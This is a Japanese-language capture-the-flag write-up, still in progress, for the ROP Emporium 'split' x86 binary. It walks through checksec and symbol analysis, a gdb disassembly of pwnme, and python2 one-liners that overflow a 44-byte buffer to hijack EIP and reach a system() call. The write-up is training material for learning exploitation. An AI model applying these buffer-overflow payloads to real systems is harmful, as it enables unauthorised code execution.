# Split

## Description

## Solution

### 表層解析

```
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
```

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73) Symbols	  No	0		3	split32
```

```
0804a042 B __bss_start
0804a048 b completed.7283
0804a028 D __data_start
0804a028 W data_start
08048490 t deregister_tm_clones
08048470 T _dl_relocate_static_pie
08048510 t __do_global_dtors_aux
08049f10 d __do_global_dtors_aux_fini_array_entry
0804a02c D __dso_handle
08049f14 d _DYNAMIC
0804a042 D _edata
0804a04c B _end
08048694 T _fini
080486a8 R _fp_hw
08048540 t frame_dummy
08049f0c d __frame_dummy_init_array_entry
08048894 r __FRAME_END__
0804a000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
08048718 r __GNU_EH_FRAME_HDR
08048374 T _init
08049f10 d __init_array_end
08049f0c d __init_array_start
080486ac R _IO_stdin_used
08048690 T __libc_csu_fini
08048630 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08048546 T main
         U memset@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
080485ad t pwnme
         U read@@GLIBC_2.0
080484d0 t register_tm_clones
         U setvbuf@@GLIBC_2.0
08048430 T _start
0804a044 B stdout@@GLIBC_2.0
         U system@@GLIBC_2.0
0804a044 D __TMC_END__
0804860c t usefulFunction
0804a030 D usefulString
08048480 T __x86.get_pc_thunk.bx
```

usefulFunctionに飛ばせば良さそう。

canaryがないのでbuffer overflowぽそう

pwnmeから飛ばすのは前と同じぽい

## 動的解析

pwnmeの挙動をみる

```
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:	push   ebp
   0x080485ae <+1>:	mov    ebp,esp
   0x080485b0 <+3>:	sub    esp,0x28
   0x080485b3 <+6>:	sub    esp,0x4
   0x080485b6 <+9>:	push   0x20
   0x080485b8 <+11>:	push   0x0
   0x080485ba <+13>:	lea    eax,[ebp-0x28]
   0x080485bd <+16>:	push   eax
   0x080485be <+17>:	call   0x8048410 <memset@plt>
   0x080485c3 <+22>:	add    esp,0x10
   0x080485c6 <+25>:	sub    esp,0xc
   0x080485c9 <+28>:	push   0x80486d4
   0x080485ce <+33>:	call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:	add    esp,0x10
   0x080485d6 <+41>:	sub    esp,0xc
   0x080485d9 <+44>:	push   0x8048700
   0x080485de <+49>:	call   0x80483c0 <printf@plt>
   0x080485e3 <+54>:	add    esp,0x10
   0x080485e6 <+57>:	sub    esp,0x4
   0x080485e9 <+60>:	push   0x60
   0x080485eb <+62>:	lea    eax,[ebp-0x28]
   0x080485ee <+65>:	push   eax
   0x080485ef <+66>:	push   0x0
   0x080485f1 <+68>:	call   0x80483b0 <read@plt>
   0x080485f6 <+73>:	add    esp,0x10
   0x080485f9 <+76>:	sub    esp,0xc
   0x080485fc <+79>:	push   0x8048703
   0x08048601 <+84>:	call   0x80483d0 <puts@plt>
   0x08048606 <+89>:	add    esp,0x10
   0x08048609 <+92>:	nop
   0x0804860a <+93>:	leave  
   0x0804860b <+94>:	ret    
End of assembler dump.

```

疑似コード書いてみるかぁ

```
read(0,ebp-0x28,0x60)
```

前と同じぽいので、とりあえずもう一回pwnmeを繰り返して挙動を見てみた

```
❯ python2 -c "print 'A'*44 + '\xc3\x85\x04\x08'" | ./split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
Contriving a reason to ask user for data...
> Thank you!
fish: Process 79230, './split32' from job 1, 'python2 -c "print 'A'*44 + '\xc…' terminated by signal SIGSEGV (Address boundary error)

```

期待通りの挙動をしたので、eipは取れてるっぽい

じゃぁusefulFunctionに飛ばして挙動を確認するか

```
0804860c <usefulFunction>:
 804860c:       55                      push   ebp
 804860d:       89 e5                   mov    ebp,esp
 804860f:       83 ec 08                sub    esp,0x8
 8048612:       83 ec 0c                sub    esp,0xc
 8048615:       68 0e 87 04 08          push   0x804870e
 804861a:       e8 c1 fd ff ff          call   80483e0 <system@plt>
 804861f:       83 c4 10                add    esp,0x10
 8048622:       90                      nop
 8048623:       c9                      leave  
 8048624:       c3                      ret    
 8048625:       66 90                   xchg   ax,ax
 8048627:       66 90                   xchg   ax,ax
 8048629:       66 90                   xchg   ax,ax
 804862b:       66 90                   xchg   ax,ax
 804862d:       66 90                   xchg   ax,ax
 804862f:       90                      nop


```

なのでここに飛ばす

```
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
flag.txt  peda-session-split32.txt  README.md  split32
fish: Process 80877, './split32' from job 1, 'python2 -c "print 'A'*44 + '\x0…' terminated by signal SIGSEGV (Address boundary error)

```

なんかlsが実行されているっぽい

だからどうにかして/bin/cat flag.txt  を実行してあげる必要がありそう。



